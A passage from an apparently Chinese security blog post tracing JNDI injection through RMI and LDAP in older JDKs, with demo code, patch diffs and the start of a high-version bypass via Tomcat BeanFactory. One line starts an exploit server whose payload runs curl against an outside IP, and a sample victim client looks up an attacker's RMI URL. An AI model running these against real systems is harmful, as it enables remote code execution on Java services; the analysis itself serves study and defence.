RefAddr addr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//从此引用中删除所有地址。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//检索索引posn上的地址。</span></span><br><span class="line"></span><br><span class="line">RefAddr <span class="title function_">get</span><span class="params">(<span class="type">int</span> posn)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//检索本参考文献中地址的列举。</span></span><br><span class="line"></span><br><span class="line">Enumeration&lt;RefAddr&gt; <span class="title function_">getAll</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//检索引用引用的对象的类名。</span></span><br><span class="line"></span><br><span class="line">String <span class="title function_">getClassName</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//检索此引用引用的对象的工厂位置。</span></span><br><span class="line"></span><br><span class="line">String <span class="title function_">getFactoryClassLocation</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//检索此引用引用对象的工厂的类名。</span></span><br><span class="line"></span><br><span class="line">String <span class="title function_">getFactoryClassName</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//从地址列表中删除索引posn上的地址。</span></span><br><span class="line"></span><br><span class="line">Object <span class="title function_">remove</span><span class="params">(<span class="type">int</span> posn)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//检索此引用中的地址数。</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">size</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//生成此引用的字符串表示形式。</span></span><br><span class="line"></span><br><span class="line">String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>demo如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiTest</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException, AlreadyBoundException &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, url);</span><br><span class="line"></span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line"></span><br><span class="line">registry.bind(<span class="string">&quot;aa&quot;</span>,referenceWrapper);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里在调用完Reference又使用ReferenceWrapper对前面的reference对象进行了封装，之所以这么做是因为Reference没有实现Remote接口也没有继承UnicastRemoteObject类。（将类注册到Registry需要实现Remote和继承UnicastRemoteObject类）</p><h2 id="jndi-rmi-注入">jndi + rmi 注入</h2><p>服务端还是利用 <a href="https://www.yuque.com/zqiangweihuakai/kb/yk0fv5pk1ssnkqxr">https://www.yuque.com/zqiangweihuakai/kb/yk0fv5pk1ssnkqxr</a> 此篇的rmi服务端代码<br>利用jndi 调用rmi服务端的服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.rmi;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jndi</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置JNDI环境</span></span><br><span class="line"></span><br><span class="line">Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line"></span><br><span class="line">env.put(Context.PROVIDER_URL, <span class="string">&quot;rmi://127.0.0.1:8989&quot;</span>);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">//初始上下文，其实通俗点来讲就是获取初始目录环境。</span></span><br><span class="line"></span><br><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">//调用远程类</span></span><br><span class="line"></span><br><span class="line"><span class="type">Servicetest</span> <span class="variable">Servicetest</span> <span class="operator">=</span>(Servicetest)initialContext.lookup(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">re</span> <span class="operator">=</span> Servicetest.test();</span><br><span class="line"></span><br><span class="line">System.out.println(re);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="JNDI-DNS">JNDI+DNS</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DNSClient</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.dns.DnsContextFactory&quot;</span>);</span><br><span class="line"></span><br><span class="line">env.put(Context.PROVIDER_URL, <span class="string">&quot;dns://114.114.114.114&quot;</span>);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">DirContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialDirContext</span>(env);</span><br><span class="line"></span><br><span class="line"><span class="type">Attributes</span> <span class="variable">res</span> <span class="operator">=</span> ctx.getAttributes(<span class="string">&quot;quan9i.top&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;A&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">System.out.println(res);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line"></span><br><span class="line">e.printStackTrace();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考:<br><a href="https://goodapple.top/archives/696">https://goodapple.top/archives/696</a><br><a href="https://xz.aliyun.com/t/13421">https://xz.aliyun.com/t/13421</a><br><a href="https://xz.aliyun.com/t/12277">https://xz.aliyun.com/t/12277</a><br><a href="https://eastjun.top/posts/jndi_inject/">https://eastjun.top/posts/jndi_inject/</a><br><a href="https://tttang.com/archive/1611/#toc_">https://tttang.com/archive/1611/#toc_</a><br>[<a href="https://xz.aliyun.com/t/7079?time__1311=n4%2BxnD0Dy7itGQNKGNnmAzti%3DDkW3DB7in1oD">https://xz.aliyun.com/t/7079?time__1311=n4%2BxnD0Dy7itGQNKGNnmAzti%3DDkW3DB7in1oD</a>](<a href="https://xz.aliyun.com/t/7079?time__1311=n4%2BxnD0Dy7itGQNKGNnmAzti%3DDkW3DB7in1oD">https://xz.aliyun.com/t/7079?time__1311=n4%2BxnD0Dy7itGQNKGNnmAzti%3DDkW3DB7in1oD</a><br><a href="https://xz.aliyun.com/t/7264?time__1311=n4%2BxnD0Dy7G%3DBxGqGNnmADR7DgDfErrx3%2BBbD#toc-0">https://xz.aliyun.com/t/7264?time__1311=n4%2BxnD0Dy7G%3DBxGqGNnmADR7DgDfErrx3%2BBbD#toc-0</a></p><h2 id="JNDI加RMI注入低版本执行流程">JNDI加RMI注入低版本执行流程</h2><p>这里选择使用别人写好的工具启用一个服务端，也可以选择自己简单写一个，我这里为了方便就使用别人的工具</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar</span><br><span class="line">启动命令</span><br><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C curl <span class="number">47.101</span><span class="number">.63</span><span class="number">.120</span>:<span class="number">8081</span></span><br></pre></td></tr></table></figure><p>被攻击的客户端代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDNIAttack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(<span class="string">&quot;rmi://10.169.5.226:1099/wnys6l&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开始进行分析</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732288977241-fddf5695-7d1b-46f9-a1a7-cbc6102983db.png" alt=""></p><p>继续跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732288995665-71ace546-b339-4f08-a711-fa264ac3140c.png" alt=""></p><p>继续跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732289007284-12f2a2f3-c3b4-4ecc-88ce-884e95111229.png" alt=""></p><p>在这里可以看到有个熟悉的registry.lookup，其实这里的registry的值就是<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732289055879-27faadb1-77aa-4b6d-8a41-b7b915f2cc25.png" alt=""></p><p>所以这里面是存在着rmi反序列化漏洞的。这里先不管这个继续跟到下面decodeObject方法里</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732289150799-9c2fb85c-dd52-4d36-8651-6f57372f265d.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732289178902-3b1cfb3a-8e91-449e-8204-67036c5b41a7.png" alt=""></p><p>这里箭头所指的作用就是将ReferenceWrapper还原成reference，继续跟到NamingManager.getObjectInstance方法里去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732289299965-e264b2da-b36e-43cd-b740-5f48fa9f4806.png" alt=""></p><p>跟进箭头所指的地方</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732289356766-9ac41169-776f-4a28-a136-52faac5444cf.png" alt=""></p><p>这里会进行类加载，跟进去看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732289510521-53ff09db-275c-4f7b-93d3-8acdf16adbf9.png" alt=""> 这里会先从本地加载我们穿进去的类，但是肯定是不存在的</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732290309773-981648e4-f3e1-4312-a5a3-a6a8843d94cf.png" alt=""></p><p>之后就会去这里通过codebase 找，也就是我们传入的远程地址，然后进行加载</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732290373830-85cc86ae-96cd-4cb5-9379-c0902fede4fa.png" alt=""></p><p>这里如果是静态代码块就会直接加载执行了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732290459987-5857aad8-73b7-4d1d-868a-2425e71b3566.png" alt=""></p><p>如果是构造函数就会是实例化</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732290545958-2c8c1696-cf32-4b7b-b59b-29eea36de030.png" alt=""></p><h3 id="JDNI低版本修复">JDNI低版本修复</h3><p>对比下新旧版JDK的com.sun.jndi.rmi.registry.RegistryContext类的decodeObject()函数的代码就很清楚了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 低版本JDK</span></span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var3</span> <span class="operator">=</span> var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">            <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="built_in">this</span>, <span class="built_in">this</span>.environment);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            <span class="type">NamingException</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>();</span><br><span class="line">            var4.setRootCause(var7);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 高版本JDK</span></span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var3</span> <span class="operator">=</span> var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">            <span class="type">Reference</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">                var8 = (Reference)var3;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">                var8 = ((Referenceable)((Referenceable)var3)).getReference();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var8 != <span class="literal">null</span> &amp;&amp; var8.getFactoryClassLocation() != <span class="literal">null</span> &amp;&amp; !trustURLCodebase) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="built_in">this</span>, <span class="built_in">this</span>.environment);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            <span class="type">NamingException</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>();</span><br><span class="line">            var4.setRootCause(var7);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>很明显，就只是在使用URLClassLoader加载器加载远程类之前加了个if语句检测com.sun.jndi.ldap.object.trustURLCodebase的值是否为true，而该设置项的值默认为false。</p><h2 id="JNDI加LDAP低版本注入执行流程">JNDI加LDAP低版本注入执行流程</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732335913754-c2a241e5-38a7-44a6-9d2e-1877b814e32b.png" alt=""></p><p>这里主要是跟前面的协议不同调用不同的lookup，继续跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732335965221-01d93508-c9b5-4c7b-bc9a-7a0a1ffffa1a.png" alt=""></p><p>继续跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336071774-485c1b9b-a7fd-4275-a2ce-ac2014359102.png" alt=""></p><p>继续跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336108528-ca7357f1-5a89-4ae5-a314-a75120d56cee.png" alt=""></p><p>接着跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336144415-f6e379cf-4c62-4892-9931-b55ffaafc137.png" alt=""></p><p>重点在decodeObject这里，这里的attrs就是ldap上的属性</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336198575-d4c3b2aa-d7c0-49d2-b184-867e6ef1f5e4.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336329918-c3999510-3636-4c16-9536-195c4600a009.png" alt=""></p><p>继续跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336377793-f3293112-8156-4f66-9e1a-5fa6b37ea437.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336776593-e3a00c5d-8f17-42ec-856c-c160975c64d7.png" alt=""></p><p>这里就是获取一些值解析这些属性，可以看到这里有许多判断条件，是因为jndi支持许多类型保存</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336475205-e28c2394-a9e5-47d6-bf71-ecc73fdccc46.png" alt=""></p><p>可以看到如果是序列化的话就会调用反序列化，如果是引用的话就调用</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336618693-c36fab70-47fe-411d-8429-d8cbcf85aa81.png" alt=""></p><p>就会将我们的引用给解析出来，跟rmi的类似，解出来之后</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336890350-01406172-185a-4551-a085-785b7bebe41f.png" alt=""></p><p>回到这里继续跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336963349-f79759cd-e716-4148-b9c7-841a50ed480b.png" alt=""></p><p>和rmi就基本一样了到这里。</p><h3 id="LDAP低版本修复">LDAP低版本修复</h3><p>比较下新旧版本的com.sun.naming.internal.VersionHelper12类loadClass()函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 旧版本JDK</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> className A non-null fully qualified class name.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> codebase A non-null, space-separated list of URL strings.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)</span><br><span class="line">            <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">parent</span> <span class="operator">=</span> getContextClassLoader();</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span></span><br><span class="line">                 URLClassLoader.newInstance(getUrlArray(codebase), parent);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> loadClass(className, cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 新版本JDK</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> className A non-null fully qualified class name.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> codebase A non-null, space-separated list of URL strings.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)</span><br><span class="line">            <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;true&quot;</span>.equalsIgnoreCase(trustURLCodebase)) &#123;</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">parent</span> <span class="operator">=</span> getContextClassLoader();</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span></span><br><span class="line">                    URLClassLoader.newInstance(getUrlArray(codebase), parent);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> loadClass(className, cl);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>很明显，就只是在使用URLClassLoader加载器加载远程类之前加了个if语句检测com.sun.jndi.ldap.object.trustURLCodebase的值是否为true，而该设置项的值默认为false。</p><h2 id="JNDI高版本绕过">JNDI高版本绕过</h2><p>这里啰嗦说很多，就直接总结网上师傅们所说的，其实就是能够在本地找到一个工厂类并且实现了ObjectFactory接口，并且存在getObjectInstance方法，就可以进行尝试探索利用。而这里比较常用的一个是tomcat的<code>org.apache.naming.factory.BeanFactory</code> 工厂类去调用 <code>javax.el.ELProcessor#eval</code>方法。这里我们看一下他的执行过程。</p><p>我们可以直接来到这一步</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732953708726-827aaef6-5537-4b46-9296-cefba6f8d217.png" 